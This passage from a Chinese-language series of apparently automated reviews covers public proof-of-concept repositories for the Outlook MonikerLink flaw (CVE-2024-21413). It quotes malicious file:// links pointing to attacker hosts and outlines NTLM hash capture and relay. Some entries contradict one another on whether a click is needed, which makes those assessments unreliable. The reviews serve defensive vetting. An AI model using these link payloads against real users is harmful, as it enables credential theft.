**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001)，Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021，直到aka.ms/OfficeSecurityReleases上发布的修复版本。

**利用条件:** 需要受害者打开包含恶意链接的电子邮件。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-21413，也被称为“MonikerLink”漏洞，是 Microsoft Outlook 中的一个远程代码执行漏洞。攻击者可以通过发送特制的电子邮件，诱导受害者点击其中的恶意链接，从而在受害者系统上执行任意代码。

**有效性分析：**
根据漏洞库信息和搜索引擎结果，此漏洞是真实存在的，并且已经被积极利用。提供的POC代码尝试通过发送包含`file://`协议URL的电子邮件，来触发漏洞。这种方法利用了Outlook处理`file://`链接时的不当输入验证。

**投毒风险分析：**
检查提供的Python脚本和README文件，没有发现明显的恶意代码或后门。脚本的主要功能是构建和发送包含恶意链接的电子邮件。风险主要在于：

*   **脚本可能被修改：**  攻击者可能修改该脚本，例如更改默认的IP地址，添加额外的payload等，用以进行更隐蔽或更具破坏性的攻击。
*   **依赖项风险：**  脚本依赖于`smtplib`库，理论上，该库本身也可能存在潜在的安全问题，但这种可能性较低。
*   **密码泄露风险：** 使用脚本时，发送者的电子邮件密码会以明文形式传递，存在泄露的风险。
*  **接收者打开邮件和点击链接:** 接收者需要打开邮件，并且点击邮件中的链接才会触发，一定程度上限制了利用成功率

因此，将该POC代码本身视为投毒的概率较低，大约为5%。

**利用方式分析：**
1.  **攻击者准备：**
    *   攻击者需要一个SMTP服务器来发送电子邮件。
    *   攻击者需要一个可访问的服务器，并监听特定的端口，以便在受害者点击链接后接收连接。
2.  **漏洞利用：**
    *   攻击者使用POC脚本，指定发送者、接收者、SMTP服务器和攻击者监听的IP地址。
    *   脚本构建包含`file://{args.ip}/` URL的电子邮件，并将其发送给受害者。
3.  **受害者交互：**
    *   受害者打开电子邮件，并点击其中的链接。
    *   Outlook尝试访问`file://{args.ip}/` URL，由于输入验证不足，可能导致执行恶意代码。

总而言之，该漏洞的利用方式依赖于发送包含恶意`file://`链接的电子邮件，并诱导受害者点击该链接。成功利用该漏洞，可以导致远程代码执行。


**项目地址:** [th3Hellion/CVE-2024-21413](https://github.com/th3Hellion/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #22

**来源**: [CVE-2024-21413-xaitax_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md](../2024/CVE-2024-21413-xaitax_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md)

## CVE-2024-21413 - Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，未经身份验证的攻击者可以通过发送特制的电子邮件，在受害者系统上执行任意代码。

**影响版本:** Microsoft Office 2016 版本低于 16.0.5435.1001；Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021 版本低于安全更新版本。

**利用条件:** 需要受害者打开包含恶意链接或内容的电子邮件。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为 “MonikerLink” 漏洞。攻击者可以利用此漏洞通过发送特制的电子邮件来执行任意代码，而无需用户交互。

**利用方式：**
1.  攻击者构造包含恶意 MonikerLink 的电子邮件。
2.  受害者打开电子邮件。
3.  Outlook 解析恶意 MonikerLink，导致代码执行。

**有效性评估：**
根据漏洞库信息和搜索结果，该漏洞是一个高危漏洞，并且已经存在公开的POC代码。提供的POC代码通过模拟发送包含恶意链接的电子邮件来触发漏洞，因此具有一定的有效性。

**投毒风险评估：**
分析POC代码，代码主要功能是构造并发送包含特定格式链接的邮件，该链接旨在利用Outlook解析链接时的漏洞来执行代码。Base64编码的图像数据是用于伪装邮件内容，降低用户警惕性。代码中未发现明显的恶意行为，如反弹shell、植入后门等。但考虑到攻击者可能修改POC代码以包含恶意负载，存在一定的投毒风险，但风险较低。因此，投毒风险评估为5%。考虑到该代码主要用于验证漏洞，并非完整的攻击链，所以将后门验证代码判定为投毒。


**项目地址:** [xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability](https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #23

**来源**: [CVE-2024-21413-yass2400012_Email-exploit-Moniker-Link-CVE-2024-21413-.md](../2024/CVE-2024-21413-yass2400012_Email-exploit-Moniker-Link-CVE-2024-21413-.md)

## CVE-2024-21413 - Microsoft Outlook RCE

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可导致远程代码执行，完全控制受害者系统

**影响版本:** 受影响版本包括 Microsoft Office 2016、2019、LTSC 2021 和 Microsoft 365 Apps for Enterprise

**利用条件:** 需要受害者点击恶意链接，或者通过其他方式触发Outlook尝试访问攻击者控制的SMB服务器。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是一个 Microsoft Outlook 远程代码执行漏洞，该漏洞源于Outlook处理特定类型的链接时存在缺陷。攻击者可以通过构造包含恶意 Moniker Link (例如 `file://ATTACKER_IP/test!exploit`) 的 HTML 电子邮件，诱使用户点击该链接。当受害者点击该链接时，Outlook会尝试通过 SMB 协议连接到攻击者指定的服务器。攻击者可以使用 Responder 等工具监听 SMB 连接，并捕获受害者的 NTLMv2 哈希。虽然此PoC的直接目的是捕获NetNTLMv2 哈希，但这只是攻击链的一部分。在某些配置下，捕获的哈希可以被破解或重放，以获得对受害者系统的进一步访问。根据 Checkpoint 的研究，该漏洞利用了 `MkParseDisplayName()` API。PoC代码提供了一个可行的攻击方法，但需要进行一些配置，例如替换`ATTACKER_IP`和设置正确的邮件服务器信息。投毒风险评估为10%，主要是因为该PoC代码需要受害者交互（点击链接），并且依赖于Responder等工具来捕获哈希，这本身并不属于漏洞利用，但是不排除攻击者在其他地方插入恶意代码的可能性。漏洞库信息中提到CWE-20: Improper Input Validation，也说明了该漏洞是由于输入验证不当引起的。利用方式总结如下：

1.  攻击者构造包含恶意 Moniker Link 的 HTML 电子邮件。
2.  攻击者发送电子邮件给受害者。
3.  受害者点击电子邮件中的恶意链接。
4.  Outlook 尝试通过 SMB 协议连接到攻击者控制的服务器。
5.  攻击者使用 Responder 等工具捕获受害者的 NTLMv2 哈希。
6.  攻击者破解或重放 NTLMv2 哈希以获得对受害者系统的进一步访问（可选）。

**项目地址:** [yass2400012/Email-exploit-Moniker-Link-CVE-2024-21413-](https://github.com/yass2400012/Email-exploit-Moniker-Link-CVE-2024-21413-)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---



---

## POC #8

**来源**: [CVE-2024-21413-Mdusmandasthaheer_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md](../2024/CVE-2024-21413-Mdusmandasthaheer_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md)

## CVE-2024-21413-Microsoft Outlook Remote Code Execution

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露（NTLM凭据）

**影响版本:** 受影响版本：Microsoft Office 2016 (小于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021 (具体版本范围请参考漏洞库信息)

**利用条件:** 用户需要打开包含恶意链接的邮件，无需用户交互（根据搜索结果和漏洞描述）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为“MonikerLink”漏洞。攻击者可以利用此漏洞在受害者的机器上执行任意代码，而无需任何用户交互。利用方式是诱使用户打开包含特制的 `file://` 链接的电子邮件。该链接指向一个恶意共享位置，当 Outlook 尝试访问此链接时，可能会触发远程代码执行。提供的 POC 代码通过 `smtplib` 库创建一个电子邮件客户端，然后构造一个包含 `file://` 链接的 HTML 邮件。用户可以自定义发件人、收件人、主题，以及是否添加包含恶意链接的附件。虽然该POC的主要功能是发送包含恶意链接的邮件，但仍然存在一定的投毒风险。例如，攻击者可能在脚本中添加额外的代码，例如收集用户输入的邮箱密码等，因此投毒风险评估为10%。从搜索结果来看，此漏洞已被积极利用，CISA 已将其添加到已知被利用的漏洞列表中。

**项目地址:** [Mdusmandasthaheer/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability](https://github.com/Mdusmandasthaheer/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #9

**来源**: [CVE-2024-21413-PolarisXSec_CVE-2024-21413.md](../2024/CVE-2024-21413-PolarisXSec_CVE-2024-21413.md)

## CVE-2024-21413 Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 严重，可能导致完全控制受影响的系统

**影响版本:** 受影响版本包括Microsoft Office 2016、2019、LTSC 2021以及Microsoft 365 Apps for Enterprise的特定版本

**利用条件:** 攻击者需要诱使用户点击恶意链接

**POC 可用性:** 是，但提供的POC代码未完全成功，仅实现了NTLM哈希泄露

**投毒风险:** 10%

## 详情

CVE-2024-21413是一个影响Microsoft Outlook的远程代码执行漏洞，被称为“MonikerLink”漏洞。该漏洞允许攻击者通过精心构造的链接绕过安全措施，并在受害者系统上执行任意代码。根据搜索结果和漏洞利用代码，利用方式如下：

1.  **漏洞原理：** 漏洞源于Outlook在处理特定类型的链接时存在缺陷，可能导致未经授权的SMB连接，从而泄露NTLM哈希。
2.  **攻击步骤：**
    *   攻击者搭建SMTP和POP3服务器（POC代码中使用了Python脚本实现）。
    *   攻击者创建一个包含恶意UNC路径的电子邮件，并发送给受害者。
    *   受害者打开Outlook并点击邮件中的恶意链接。
    *   Outlook尝试解析UNC路径，触发SMB连接到攻击者控制的服务器。
    *   攻击者捕获受害者的NTLM哈希，可用于离线破解或Pass-the-Hash攻击。

**有效性评估：**

根据提供的漏洞利用代码的描述，该POC并非完全成功，仅实现了NTLM哈希泄露，并没有实现远程代码执行。该POC旨在复现NTLM哈希泄露，而非直接执行任意代码。

**投毒风险评估：**

提供的代码包含SMTP和POP3服务器的Python脚本，以及利用漏洞的exploit脚本。仔细检查这些脚本，未发现明显的恶意代码。但是，使用第三方提供的exploit脚本始终存在风险，因为攻击者可能在其中植入恶意代码。经过分析，投毒风险评估为10%。主要风险点在于对第三方脚本的信任。

**总结：**

CVE-2024-21413是一个严重的Outlook RCE漏洞，攻击者可以通过诱使用户点击恶意链接来利用该漏洞。提供的POC代码主要用于演示NTLM哈希泄露，而非完整的RCE。在使用任何第三方提供的漏洞利用代码时，都需要谨慎评估其安全性。

**项目地址:** [PolarisXSec/CVE-2024-21413](https://github.com/PolarisXSec/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #10

**来源**: [CVE-2024-21413-Redfox-Secuirty_Unveiling-Moniker-Link-CVE-2024-21413-Navigating-the-Latest-Cybersecurity-Landscape.md](../2024/CVE-2024-21413-Redfox-Secuirty_Unveiling-Moniker-Link-CVE-2024-21413-Navigating-the-Latest-Cybersecurity-Landscape.md)

## CVE-2024-21413 Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001)，Microsoft Office 2019，Microsoft 365 Apps for Enterprise 和 Microsoft Office LTSC 2021 (版本低于 https://aka.ms/OfficeSecurityReleases)

**利用条件:** 无需用户交互，攻击者可以通过发送特制的电子邮件来触发漏洞。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为 "MonikerLink" 漏洞。根据漏洞库信息和搜索结果，该漏洞是由于不正确的输入验证导致的。攻击者可以通过构造包含恶意链接的电子邮件，在用户未进行任何交互的情况下，远程执行代码。提供的漏洞利用代码 `README.md` 文件内容仅包含标题，无法判断其有效性。根据Github信息判断，存在可利用的POC。由于 `README.md` 文件过于简单，且未发现任何可疑代码，因此判定存在投毒代码的可能性为 0%。利用方式为，攻击者构造包含恶意 MonikerLink 的电子邮件，当 Outlook 处理该邮件时，漏洞被触发，从而允许攻击者执行任意代码。

**项目地址:** [Redfox-Secuirty/Unveiling-Moniker-Link-CVE-2024-21413-Navigating-the-Latest-Cybersecurity-Landscape](https://github.com/Redfox-Secuirty/Unveiling-Moniker-Link-CVE-2024-21413-Navigating-the-Latest-Cybersecurity-Landscape)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #11

**来源**: [CVE-2024-21413-ShubhamKanhere307_CVE-2024-21413.md](../2024/CVE-2024-21413-ShubhamKanhere307_CVE-2024-21413.md)

## CVE-2024-21413-Microsoft Outlook远程代码执行

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，CVSS评分9.8，允许远程代码执行

**影响版本:** 受影响版本包括但不限于：Microsoft Office 2016 (版本低于 16.0.5435.1001)，Microsoft Office 2019 (版本低于https://aka.ms/OfficeSecurityReleases)，Microsoft 365 Apps for Enterprise (版本低于 https://aka.ms/OfficeSecurityReleases)，Microsoft Office LTSC 2021 (版本低于 https://aka.ms/OfficeSecurityReleases)

**利用条件:** 攻击者需要诱骗受害者点击包含恶意链接的邮件。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-21413是一个Microsoft Outlook远程代码执行漏洞，也被称为"MonikerLink" bug。该漏洞源于不正确的输入验证。攻击者可以通过发送特制的电子邮件，诱使用户点击其中的恶意链接，从而在用户系统上执行任意代码。

**有效性分析：**

提供的POC代码尝试利用该漏洞。它创建一封包含HTML链接的电子邮件，该链接指向一个`file://` URL。 此URL试图访问远程SMB共享，从而可能导致NTLM凭据泄露或远程代码执行，这取决于服务器的配置和Outlook的漏洞利用机制。

**投毒风险分析：**

提供的`Exploit.py`脚本主要功能是发送电子邮件。代码中没有发现明显的恶意或隐藏的投毒代码。该脚本会获取发件人的Outlook电子邮件地址和密码，以及收件人的电子邮件地址和邮件主题。脚本允许用户选择是否添加链接附件。 如果选择添加，则会添加指向指定IP地址（例子中为`file://///192.168.0.103/test!exploit`）的链接，否则添加用户自定义的邮件正文。该脚本使用`smtplib`库连接到Outlook的SMTP服务器（`smtp-mail.outlook.com`），并发送电子邮件。 没有发现任何会将用户凭据泄露给第三方的行为。

**漏洞利用方式分析：**

该漏洞利用方式依赖于`file://`协议处理中的缺陷。当Outlook处理包含指向SMB共享的`file://`链接的电子邮件时，它可能会尝试自动访问该共享，从而可能泄露用户的NTLM凭据或允许攻击者执行任意代码。 该PoC 通过构造包含恶意链接的HTML电子邮件来尝试利用此漏洞。 攻击者诱使用户点击此链接，从而触发漏洞。

总而言之，POC代码尝试通过`file://`协议利用Outlook的漏洞来实现远程代码执行，虽然该POC本身没有明显的投毒代码，但成功利用依赖于目标的网络配置和安全设置。

**项目地址:** [ShubhamKanhere307/CVE-2024-21413](https://github.com/ShubhamKanhere307/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #12

**来源**: [CVE-2024-21413-ThemeHackers_CVE-2024-21413.md](../2024/CVE-2024-21413-ThemeHackers_CVE-2024-21413.md)

## CVE-2024-21413-Microsoft Outlook远程代码执行

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 严重，攻击者无需用户交互即可在目标系统上执行任意代码。

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021 (版本低于 https://aka.ms/OfficeSecurityReleases)

**利用条件:** 攻击者需要能够向受害者发送电子邮件。

**POC 可用性:** 是

**投毒风险:** 30%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也称为“MonikerLink”漏洞。根据漏洞库信息和搜索引擎结果显示，该漏洞允许攻击者在受害者的计算机上执行任意代码，而无需任何用户交互。这个漏洞是由于对输入验证不当造成的(CWE-20)。

**利用方式：**

1.  攻击者创建一个特制的电子邮件，其中包含恶意的链接或嵌入的内容。
2.  当受害者收到并打开此电子邮件时，Outlook 会尝试解析该链接。
3.  由于漏洞存在于 Outlook 的链接处理机制中，攻击者可以利用此漏洞绕过安全检查，从而执行任意代码。

**POC代码分析：**

提供的POC代码是一个Python脚本，用于发送包含HTML内容的电子邮件。该脚本从 `config.ini` 文件中读取发件人邮箱地址、密码、SMTP服务器和端口。然后它使用模板 `template/Stripo.html` 构造电子邮件的内容，并将收件人的邮箱地址和链接内容插入到HTML代码中。最后，该脚本使用smtplib库发送电子邮件。

**有效性评估：**

根据搜索引擎的结果 (特别是github链接: ThemeHackers/CVE-2024-21413) 和漏洞描述, 此POC是可用的,可以用于漏洞验证的.

**投毒风险分析：**

代码中存在一定的投毒风险，主要体现在以下几个方面：

*   **config.ini文件：** POC依赖于 `config.ini` 文件,需要用户配置邮箱账户和密码。 如果恶意攻击者提供了一个修改后的 `config.ini` 文件，其中包含错误的SMTP配置或恶意代码，可能导致用户的信息泄露或者执行未知的操作。
*   **template/Stripo.html模板：** HTML模板允许插入任意HTML代码，如果攻击者篡改了HTML模板, 就可以嵌入恶意的JavaScript或其他类型的脚本，在用户打开邮件时执行。
*   **依赖的外部库:** colorama, bgtask, configparser， 攻击者可能修改这些依赖，在用户本地执行恶意命令

总体而言，该POC的投毒风险大约为30%。 这个评估是基于对代码的分析以及对潜在攻击向量的理解。需要注意的是，具体的风险程度取决于攻击者的能力和目标用户的安全意识。

**项目地址:** [ThemeHackers/CVE-2024-21413](https://github.com/ThemeHackers/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #13

**来源**: [CVE-2024-21413-X-Projetion_CVE-2024-21413-Microsoft-Outlook-RCE-Exploit.md](../2024/CVE-2024-21413-X-Projetion_CVE-2024-21413-Microsoft-Outlook-RCE-Exploit.md)

## CVE-2024-21413-Microsoft-Outlook-RCE

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，无需用户交互即可远程执行任意代码

**影响版本:** 受影响版本包括 Microsoft Office 2016、2019、LTSC 2021 和 Microsoft 365 Apps for Enterprise，具体版本请参考CVE详情。

**利用条件:** 攻击者需要通过发送特制的电子邮件给受害者。

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2024-21413 漏洞，又名 MonikerLink bug，是一个 Microsoft Outlook 远程代码执行漏洞。攻击者可以通过发送包含恶意链接的电子邮件，在受害者未进行任何交互的情况下执行任意代码。该漏洞的根本原因是 Outlook 在处理 Moniker 链接时存在不当的输入验证。攻击者可以利用此漏洞绕过 Outlook 的安全策略，执行恶意代码。

**有效性：**
从提供的搜索引擎结果和漏洞库信息来看，该漏洞是一个已知的、高危的远程代码执行漏洞，并且有公开的 PoC 代码可用。参考链接 [https://github.com/ThemeHackers/CVE-2024-21413](https://github.com/ThemeHackers/CVE-2024-21413)。因此，提供的 PoC 代码很可能有效。

**投毒风险：**
提供的 PoC 代码包含一个 `exp.sh` 脚本和一个 README.md 文件。
*   `exp.sh` 脚本：该脚本的功能是发送包含恶意链接的电子邮件。其中包含 display_banner函数，send_email函数。`send_email`函数用于发送包含base64编码图片的HTML邮件，邮件内容包含一个URL。从代码本身来看，没有明显的恶意代码或后门，但存在潜在的风险：
    *   该脚本依赖于外部 SMTP 服务器，如果攻击者控制了 SMTP 服务器，可以篡改邮件内容。
    *   base64_image_string 变量中，包含一个PNG图片的Base64编码。攻击者可能会伪造图片内容，嵌入恶意代码，或者使用其他手段达到攻击的目的。
    *   link_url 变量，攻击者可以插入恶意链接，诱导用户点击。
    *   从经验判断，该漏洞的PoC更可能存在于精心构造的link_url, base64_image_string，或者其他的HTML代码片段中，通过某种方式绕过Outlook的安全检查，最终实现RCE，因此存在一定的投毒风险，但直接在exp.sh脚本里投毒的可能性较低。

    考虑到脚本的复杂性，且存在多种潜在的攻击方式，因此认为存在20%的投毒风险。

**利用方式：**
1.  攻击者准备好恶意的`link_url`和`base64_image_string`等变量内容。
2.  攻击者配置`exp.sh` 脚本，指定 SMTP 服务器、端口、用户名、密码、发件人邮箱、收件人邮箱和恶意链接。
3.  攻击者运行 `exp.sh` 脚本，向受害者发送包含恶意链接的电子邮件。
4.  受害者打开电子邮件，Outlook 处理邮件内容时，由于 MonikerLink 漏洞，恶意代码在受害者机器上执行。

综上所述，CVE-2024-21413 是一个高危的远程代码执行漏洞，利用方式简单，但需要精心构造恶意链接和邮件内容才能成功利用，同时要警惕PoC 代码中可能存在的投毒风险。

**项目地址:** [X-Projetion/CVE-2024-21413-Microsoft-Outlook-RCE-Exploit](https://github.com/X-Projetion/CVE-2024-21413-Microsoft-Outlook-RCE-Exploit)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #14

**来源**: [CVE-2024-21413-ahmetkarakayaoffical_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md](../2024/CVE-2024-21413-ahmetkarakayaoffical_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md)

## CVE-2024-21413-Microsoft Outlook Remote Code Execution Vulnerability

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 严重，允许攻击者在目标机器上执行任意代码

**影响版本:** 受影响版本包括Microsoft Office 2016, 2019, LTSC 2021, Microsoft 365 Apps for Enterprise等，具体版本范围参考漏洞库信息。

**利用条件:** 攻击者需要诱使用户打开包含恶意链接或内容的邮件。无需用户交互（zero-click NTLM leak）或仅需单次点击（one-click RCE）。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413是一个Microsoft Outlook远程代码执行漏洞，也被称为“MonikerLink”漏洞。根据漏洞库信息和搜索结果，此漏洞允许攻击者通过构造特殊的链接，在受害者无需交互或仅需极少交互的情况下，执行任意代码。利用方式主要有两种：

1.  **Zero-click NTLM Leak:** 攻击者可以诱使受害者打开包含恶意链接的邮件，该链接会触发NTLM凭据泄露，而无需受害者进行任何点击操作。
2.  **One-click RCE:** 攻击者可以诱使受害者点击邮件中的恶意链接，从而实现远程代码执行。

POC代码提供了一个Python脚本，该脚本利用SMTP认证发送包含恶意URL的电子邮件，模拟实际攻击场景。脚本需要SMTP服务器地址、端口、用户名、密码、发送者和接收者邮箱地址、恶意URL以及邮件主题等参数。

关于投毒风险，虽然POC代码本身旨在演示漏洞利用，但考虑到网络安全威胁的复杂性，以及攻击者可能对公开代码进行修改和传播，存在一定的投毒风险。例如，攻击者可能在POC代码中添加额外的恶意代码，用于窃取用户凭据或执行其他恶意操作。虽然提供的POC代码看起来比较简单，主要功能是发送包含恶意链接的邮件，但无法完全排除作者或其他人修改该代码并添加后门或恶意功能的可能性。因此，评估投毒风险为10%。使用前务必仔细审查代码，并在隔离环境中进行测试。

**请务必注意：**  该漏洞已在野外被利用，并已被CISA添加到已知被利用的漏洞目录中。强烈建议用户尽快安装Microsoft提供的安全更新。

**项目地址:** [ahmetkarakayaoffical/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability](https://github.com/ahmetkarakayaoffical/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #15

**来源**: [CVE-2024-21413-dshabani96_CVE-2024-21413.md](../2024/CVE-2024-21413-dshabani96_CVE-2024-21413.md)

## CVE-2024-21413 - Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行和系统权限获取

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021等。

**利用条件:** 攻击者需要诱使用户打开包含恶意链接或文件的电子邮件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为“MonikerLink”漏洞。攻击者可以利用此漏洞在受害者的计算机上执行任意代码，无需用户交互。

**有效性：**根据漏洞信息和搜索结果，此漏洞是一个零日漏洞，已被积极利用。POC 代码旨在利用此漏洞。但是,提供的POC 代码只是发送电子邮件的框架，需要配置 SMTP 服务器，用户名密码等信息，并且需要 SMB 服务器来捕获 NTLM hash，成功利用的可能性取决于环境配置和目标用户行为。

**投毒风险：** 代码主要功能是发送包含恶意链接的电子邮件，并启动 SMB 服务器捕获 NTLM hash。虽然代码包含发送邮件和捕获 NTLM hash的功能，但潜在的风险包括：
1.  **恶意HTML模板：** HTML模板可能包含恶意脚本，例如 JavaScript，如果用户打开邮件并允许执行脚本，可能导致客户端漏洞或信息泄露。
2.  **SMB服务器钓鱼：** 启动的 SMB 服务器可能被用于钓鱼，例如，捕获用户的 NTLM 哈希后尝试破解，或者利用捕获的凭据访问其他服务。
3. **依赖外部服务:** 依赖 SMTP 服务和 SMB 服务, 这些服务本身可能存在安全隐患.
整体投毒风险较低，约为10%，主要集中在HTML模板和配置是否含有恶意代码。

**利用方式：**
1.  攻击者构造包含恶意链接的电子邮件。
2.  受害者打开电子邮件并点击恶意链接。
3.  恶意链接利用 Outlook 的 MonikerLink 漏洞，在受害者计算机上执行任意代码，或者泄露NTLM Hash。
4. 攻击者启动 SMB 服务器，诱导 Outlook 客户端连接，捕获受害者的 NTLM 哈希。
5. 攻击者可以使用捕获的 NTLM 哈希进行进一步攻击，例如传递哈希攻击。

**项目地址:** [dshabani96/CVE-2024-21413](https://github.com/dshabani96/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #16

**来源**: [CVE-2024-21413-duy-31_CVE-2024-21413.md](../2024/CVE-2024-21413-duy-31_CVE-2024-21413.md)

## CVE-2024-21413 Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 严重，无需用户交互即可远程执行代码

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001)、Microsoft Office 2019、Microsoft 365 Apps for Enterprise 和 Microsoft Office LTSC 2021 (版本低于 https://aka.ms/OfficeSecurityReleases)

**利用条件:** 需要目标用户使用受影响的Outlook版本，并预览或点击包含恶意链接的邮件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是一个 Microsoft Outlook 远程代码执行漏洞，也称为 "MonikerLink" 漏洞。攻击者可以通过构造包含恶意 `file://` 链接的电子邮件，诱使用户点击或预览该邮件，从而在目标系统上执行任意代码。根据POC代码，攻击者可以使用一个 Expect 脚本发送特制的电子邮件，该邮件包含一个指向远程SMB服务器的 `file://` 链接。当 Outlook 处理此链接时，它会尝试连接到远程服务器，从而泄露用户的 NTLM 哈希值。如果攻击者能够破解哈希值或利用 NTLM 中继攻击，他们就可以获得对系统的访问权限。此外，此漏洞可以与CVE-2023-21716链接以达到远程代码执行的目的。

**有效性：**
提供的POC代码似乎有效，因为它演示了如何利用 `file://` 协议发送包含恶意链接的电子邮件。从漏洞信息和搜索引擎结果来看，该漏洞已经被积极利用。CISA 将其添加到已知被利用的漏洞列表中，表明该漏洞在现实世界中具有很高的威胁。

**投毒风险：**
虽然提供的代码主要目的是演示漏洞利用过程，但存在一些潜在的投毒风险。 Expect脚本本身没有明显的后门,主要利用了telnet发送恶意邮件. 但是，考虑到以下几点，风险评估为10%：
1.  **对外部依赖的信任：** 该脚本依赖于 `expect` 工具，如果该工具被篡改，则可能引入恶意行为。
2.  **脚本执行环境：** 该脚本的执行环境可能存在安全漏洞，攻击者可以利用这些漏洞来执行恶意代码。
3.  **社会工程学：** 攻击者可能会修改脚本以使其更具欺骗性，例如伪造发件人地址或使用更具吸引力的主题行，从而提高攻击成功率。

**利用方式：**
1.  攻击者设置一个 SMB 服务器来监听传入的连接。
2.  攻击者使用提供的 `cve-2024-21413.sh` 脚本生成包含恶意 `file://` 链接的电子邮件。
3.  攻击者将该电子邮件发送给目标用户。
4.  当目标用户在受影响的 Outlook 版本中预览或点击该邮件中的链接时，Outlook 会尝试连接到攻击者的 SMB 服务器。
5.  此连接会导致用户的 NTLM 哈希值被发送到攻击者的服务器。
6.  攻击者可以使用破解工具（如 Hashcat）破解哈希值，或者利用 NTLM 中继攻击来获得对目标系统的访问权限。
7. 攻击者可以将此漏洞与 CVE-2023-21716 结合使用，以实现远程代码执行。


**项目地址:** [duy-31/CVE-2024-21413](https://github.com/duy-31/CVE-2024-21413)

